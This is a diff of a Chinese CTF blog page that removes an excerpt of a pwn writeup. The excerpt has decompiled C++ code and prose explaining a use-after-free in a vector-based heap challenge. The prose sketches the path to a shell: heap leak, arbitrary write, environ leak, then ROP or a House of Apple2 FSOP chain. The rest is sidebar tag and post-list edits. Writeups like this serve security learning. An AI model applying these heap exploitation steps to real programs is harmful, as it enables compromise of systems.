-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span>
-    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>M_current_low <span class="token operator">=</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span><span class="token punctuation">,</span> M_current_low <span class="token operator">&lt;</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    v4 <span class="token operator">=</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">,</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">*</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-  <span class="token keyword">else</span>
-  <span class="token punctuation">&#123;</span>
-    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>漏洞出在 delete_func这边 在delete前会根据sizelist容器中成员的值，判断哪些是free状态的成员然后再erase这些成员，但是在erase的时候是根据begin() + i 去erase的，erase完后容器的大小发生了变化，下一个begin() + i 就不是原先的 begin() + i了，所以在delete的时候并不能earse连续的free状态的成员，所以存在一个uaf。 然后create的时候size也没有做下界的判断，所以可以通过create_func去创建连续负值的size去构造uaf。</p>
-<p>gift 通过sbrk 给了堆地址，就不用泄露堆地址，然后这个edit其实可以当show来用，实现出任意地址申请后，可以申请到堆上vector成员的位置，再配合edit，就可以实现多次任意地址写，泄露出environ后，用任意地址写去写子函数的返回地址打rop去getshell</p>
-<p>或者是打fsop house of apple2的利用链，只需要泄露libc还有实现一次任意地址写，之后伪造iofile，宽字符的虚表后就可以getshell</p>
-<p>劫持vector 把任意地址申请增强 转换成可以用很简单的方式实现任意地址读写的做法</p>
-<p>exp</p>
-	
-	</div>
-  <a type="button" href="/2024/08/31/nss3rd出题-Iterator-Trap解题思路/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1148,13 +1044,9 @@ gdb <span class="token parameter variable">-x</span> /home/user/gdbinit<span ari
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/ctf/">ctf<span>54</span></a></li>
-		
-			<li><a href="/categories/fmt/">fmt<span>1</span></a></li>
+			<li><a href="/categories/ctf/">ctf<span>56</span></a></li>
 		
 			<li><a href="/categories/gdb/">gdb<span>1</span></a></li>
-		
-			<li><a href="/categories/kernel/">kernel<span>1</span></a></li>
 		
 			<li><a href="/categories/misc/">misc<span>1</span></a></li>
 		
@@ -1171,20 +1063,48 @@ gdb <span class="token parameter variable">-x</span> /home/user/gdbinit<span ari
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
+			<li><a href="/tags/xv6/">xv6<span>1</span></a></li>
 		
-			<li><a href="/tags/ctf-writeup/">ctf writeup<span>54</span></a></li>
-		
-			<li><a href="/tags/rust/">rust<span>1</span></a></li>
+			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
 		
 			<li><a href="/tags/oslab/">oslab<span>1</span></a></li>
 		
+			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
+		
+			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
+		
+			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
+		
+			<li><a href="/tags/dev/">dev<span>1</span></a></li>
+		
+			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
+		
+			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/vm-pwn/">vm pwn<span>2</span></a></li>
+		
+			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
+		
 			<li><a href="/tags/misc/">misc<span>1</span></a></li>
 		
-			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
+			<li><a href="/tags/fmt/">fmt<span>6</span></a></li>
 		
-			<li><a href="/tags/gdb/">gdb<span>1</span></a></li>
+			<li><a href="/tags/rust/">rust<span>1</span></a></li>
 		
+			<li><a href="/tags/cpp-pwn/">cpp pwn<span>3</span></a></li>
+		
+			<li><a href="/tags/riscv-pwn/">riscv pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
+		
+			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>26</span></a></li>
 		 
 		</ul>
 	</div>
@@ -1195,6 +1115,10 @@ gdb <span class="token parameter variable">-x</span> /home/user/gdbinit<span ari
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2025/06/18/SmileyCTF/" ><i class="fa fa-file-o"></i>SmileyCTF</a>
+      </li>
     
       <li>
         <a href="/2025/05/03/rust入门-数据所有权与生命周期管理/" ><i class="fa fa-file-o"></i>rust入门_数据所有权与生命周期管理</a>
@@ -1210,10 +1134,6 @@ gdb <span class="token parameter variable">-x</span> /home/user/gdbinit<span ari
     
       <li>
         <a href="/2025/01/27/x3ctf/" ><i class="fa fa-file-o"></i>x3ctf</a>
-      </li>
-    
-      <li>
-        <a href="/2025/01/27/KnightCTF/" ><i class="fa fa-file-o"></i>KnightCTF</a>
       </li>
     
   </ul>
